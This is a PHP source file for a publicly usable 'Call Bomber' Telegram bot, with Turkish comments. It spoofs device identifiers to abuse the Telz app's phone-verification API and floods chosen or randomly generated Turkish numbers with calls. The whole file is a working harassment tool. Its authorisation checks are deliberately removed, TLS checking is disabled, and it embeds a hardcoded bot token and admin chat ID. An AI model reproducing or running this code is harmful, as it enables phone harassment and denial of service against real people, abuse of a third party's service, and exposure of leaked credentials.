<?php
/**
 * Ritalin Tool Call Bomber - DEBUG VERSION
 * Telz API detaylı analiz ve hata ayıklama
 * HERKES KULLANABİLİR - Yetki kontrolü kaldırıldı
 */

// ==================== KONFIGÜRASYON ====================
define('MODE', 'TEST_RANDOM_IDS');
define('GOKU', 300);
define('BASE_URL', 'https://api.telz.com/');
define('USER_AGENT', 'Telz-Android/17.5.33');
define('APP_VERSION', '17.5.33');
define('OS', 'android');
define('OS_VERSION', '15');
define('LOOP_INTERVAL', 20);
define('MAX_RUNS', 0);

// ==================== TELEGRAM BOT KONFIG ====================
define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');
define('ADMIN_CHAT_ID', '7650776904');

// Yasaklı numaralar (asla kullanma)
$BANNED_NUMBERS = [''];

// ==================== FONKSİYONLAR ====================

function randomAndroidId() {
    return bin2hex(random_bytes(8));
}

function randomDeviceName() {
    $brands = ['Pixel', 'Xiaomi', 'Samsung', 'OnePlus', 'Moto'];
    return $brands[array_rand($brands)] . '-' . substr(bin2hex(random_bytes(3)), 0, 6);
}

function generateUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

/**
 * Rastgele Türk numarası üretir (güvenli)
 */
function generateRandomTurkishNumber() {
    // Türkiye operatör kodları
    $operators = ['505', '506', '507', '530', '531', '532', '533', '534', '535', '536', '537', '538', '539', '540', '541', '542', '543', '544', '545', '546', '547', '548', '549', '550', '551', '552', '553', '554', '555', '556', '557', '558', '559', '560', '561', '562', '563', '564', '565', '566', '567', '568', '569'];
    
    $operator = $operators[array_rand($operators)];
    $number = $operator . str_pad(mt_rand(0, 9999999), 7, '0', STR_PAD_LEFT);
    return '+90' . $number;
}

function isBannedNumber($phone) {
    global $BANNED_NUMBERS;
    $cleanPhone = str_replace(['+', ' ', '-', '(', ')'], '', $phone);
    foreach ($BANNED_NUMBERS as $banned) {
        $cleanBanned = str_replace(['+', ' ', '-', '(', ')'], '', $banned);
        if ($cleanPhone === $cleanBanned) {
            return true;
        }
    }
    return false;
}

/**
 * Detaylı API isteği - Tüm yanıtı loglar
 */
function telzRequestDebug($endpoint, $payload, $androidId = null, $uuid = null) {
    if (MODE === 'TEST_RANDOM_IDS' && $androidId === null) {
        $androidId = randomAndroidId();
    }
    if ($uuid === null) $uuid = generateUUID();
    
    $payload['android_id'] = $androidId ?? '13e50e93a6399e67';
    $payload['app_version'] = APP_VERSION;
    $payload['os'] = OS;
    $payload['os_version'] = OS_VERSION;
    $payload['ts'] = (int)(microtime(true) * 1000);
    $payload['uuid'] = $uuid;
    
    $jsonPayload = json_encode($payload);
    
    $ch = curl_init(BASE_URL . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonPayload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: ' . USER_AGENT,
        'Accept-Encoding: gzip',
        'Content-Type: application/json; charset=UTF-8',
        'Accept: application/json'
    ]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $totalTime = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
    $error = curl_error($ch);
    curl_close($ch);
    
    $headers = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    
    // Log
    $logData = "\n" . str_repeat("=", 60) . "\n";
    $logData .= "📤 [$endpoint] HTTP $httpCode | " . number_format($totalTime, 3) . "s\n";
    $logData .= "📦 " . substr($jsonPayload, 0, 200) . "\n";
    $logData .= "📄 " . substr($body, 0, 500) . "\n";
    file_put_contents('telz_debug.log', $logData, FILE_APPEND);
    
    if ($httpCode === 429) {
        throw new Exception("Fazla deneme! Retry-After kontrol edin.");
    }
    if ($httpCode >= 400) {
        throw new Exception("HTTP Hata: $httpCode");
    }
    if ($error) {
        throw new Exception("CURL Hatası: $error");
    }
    
    return json_decode($body, true) ?? $body;
}

function sendCallDebug($phone) {
    // Yasaklı numara kontrolü
    if (isBannedNumber($phone)) {
        return ['success' => false, 'message' => "❌ Bu numara kullanılamaz!"];
    }
    
    try {
        $androidId = randomAndroidId();
        $uuid = generateUUID();
        $deviceName = (MODE === 'TEST_RANDOM_IDS') ? randomDeviceName() : 'Xiaomi 2311DRK48G';
        
        telzRequestDebug('app/auth_list', ['event' => 'auth_list'], $androidId, $uuid);
        telzRequestDebug('app/run', [
            'event' => 'run',
            'device_name' => $deviceName,
            'ipv4_address' => '10.1.10.1',
            'ipv6_address' => 'FE80::1',
            'lang' => 'tr',
            'network_country' => 'tr',
            'network_type' => '4G',
            'roaming' => 'no',
            'root' => 'no',
            'run_id' => '',
            'sim_country' => 'tr'
        ], $androidId, $uuid);
        
        telzRequestDebug('app/stat_btns', [
            'event' => 'stat_btns',
            'btn' => 'on_reg_continue'
        ], $androidId, $uuid);
        
        telzRequestDebug('app/validate_phonenumber', [
            'event' => 'validate_phonenumber',
            'phone' => $phone,
            'region' => 'TR'
        ], $androidId, $uuid);
        
        $result = telzRequestDebug('app/auth_call', [
            'event' => 'auth_call',
            'phone' => $phone,
            'attempt' => '0',
            'lang' => 'tr'
        ], $androidId, $uuid);
        
        if (isset($result['status']) && $result['status'] === 'ok') {
            return ['success' => true, 'message' => "✅ Arama gönderildi: $phone"];
        } else {
            $error = $result['reason'] ?? json_encode($result) ?? 'Bilinmeyen';
            return ['success' => false, 'message' => "❌ Hata: $error"];
        }
        
    } catch (Exception $e) {
        return ['success' => false, 'message' => "❌ Hata: " . $e->getMessage()];
    }
}

// ==================== TELEGRAM BOT MESAJ GÖNDER ====================
function sendTelegramMessage($chatId, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML'];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// ==================== WEBHOOK ====================
if (php_sapi_name() !== 'cli') {
    $content = file_get_contents('php://input');
    $update = json_decode($content, true);
    
    // Webhook set
    if (isset($_GET['setwebhook'])) {
        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
        $result = file_get_contents($url);
        echo $result;
        exit;
    }
    
    // Log görüntüle
    if (isset($_GET['log'])) {
        header('Content-Type: text/plain; charset=utf-8');
        if (file_exists('telz_debug.log')) {
            echo file_get_contents('telz_debug.log');
        } else {
            echo "Log dosyası bulunamadı.";
        }
        exit;
    }
    
    // Log temizle
    if (isset($_GET['clearlog'])) {
        file_put_contents('telz_debug.log', '');
        echo "Log temizlendi.";
        exit;
    }
    
    // Bot komutları - HERKES KULLANABİLİR (yetki kontrolü yok)
    if ($update && isset($update['message'])) {
        $chatId = $update['message']['chat']['id'];
        $text = $update['message']['text'] ?? '';
        
        // /start
        if ($text === '/start') {
            sendTelegramMessage($chatId, "📞 <b>Call Bomber</b>\n\n"
                . "Komutlar:\n"
                . "/call +905551234567 - Arama gönder\n"
                . "/random - Rastgele numara gönder\n"
                . "/log - Log dosyasını göster\n"
                . "/clearlog - Log'u temizle\n"
                . "/status - Bot durumu");
            exit;
        }
        
        // /random - Rastgele numara ile arama
        if ($text === '/random') {
            $randomPhone = generateRandomTurkishNumber();
            sendTelegramMessage($chatId, "📞 Rastgele numara: <code>$randomPhone</code>\n⏳ Arama gönderiliyor...");
            $result = sendCallDebug($randomPhone);
            sendTelegramMessage($chatId, $result['message']);
            exit;
        }
        
        // /log
        if ($text === '/log') {
            if (file_exists('telz_debug.log')) {
                $log = file_get_contents('telz_debug.log');
                $log = substr($log, -4000);
                sendTelegramMessage($chatId, "<pre>" . htmlspecialchars($log) . "</pre>");
            } else {
                sendTelegramMessage($chatId, "Log dosyası yok.");
            }
            exit;
        }
        
        // /clearlog
        if ($text === '/clearlog') {
            file_put_contents('telz_debug.log', '');
            sendTelegramMessage($chatId, "✅ Log temizlendi.");
            exit;
        }
        
        // /call
        if (strpos($text, '/call ') === 0) {
            $phone = trim(substr($text, 6));
            if (empty($phone)) {
                sendTelegramMessage($chatId, "❌ Numara girin: /call +905551234567");
                exit;
            }
            
            // Yasaklı numara kontrolü
            if (isBannedNumber($phone)) {
                sendTelegramMessage($chatId, "❌ Bu numara kullanılamaz!");
                exit;
            }
            
            sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...");
            $result = sendCallDebug($phone);
            sendTelegramMessage($chatId, $result['message']);
            exit;
        }
        
        // /status
        if ($text === '/status') {
            sendTelegramMessage($chatId, "✅ Bot aktif (PUBLIC MODE)\nMODE: " . MODE . "\nLOOP: " . LOOP_INTERVAL . "s\n📝 Log: " . WEBHOOK_URL . "?log");
            exit;
        }
        
        sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start");
    }
    
    // Normal HTTP isteği
    $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
    if ($phone) {
        // Yasaklı numara kontrolü
        if (isBannedNumber($phone)) {
            header('Content-Type: application/json');
            echo json_encode(['success' => false, 'message' => 'Bu numara kullanılamaz!']);
            exit;
        }
        $result = sendCallDebug($phone);
        header('Content-Type: application/json');
        echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        exit;
    }
    
    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber Aktif (Public Mode)']);
    exit;
}

// ==================== CLI BOT MODU ====================
if (php_sapi_name() === 'cli') {
    echo "\n========================================\n";
    echo "  📞 CALL BOMBER - PUBLIC MODE\n";
    echo "========================================\n";
    echo "  MODE: " . MODE . "\n";
    echo "  LOOP_INTERVAL: " . LOOP_INTERVAL . "s\n";
    echo "========================================\n\n";
    
    $phone = readline("Numara gir (+90xx) veya 'random' yaz: ");
    $phone = trim($phone);
    
    if (strtolower($phone) === 'random') {
        $phone = generateRandomTurkishNumber();
        echo "📞 Rastgele numara: $phone\n";
    }
    
    if (empty($phone)) {
        echo "❌ Numara girilmedi.\n";
        exit(1);
    }
    
    if (isBannedNumber($phone)) {
        echo "❌ Bu numara kullanılamaz!\n";
        exit(1);
    }
    
    echo "\n🚀 Arama gönderiliyor...\n";
    $result = sendCallDebug($phone);
    echo "\n📊 SONUÇ: " . $result['message'] . "\n";
}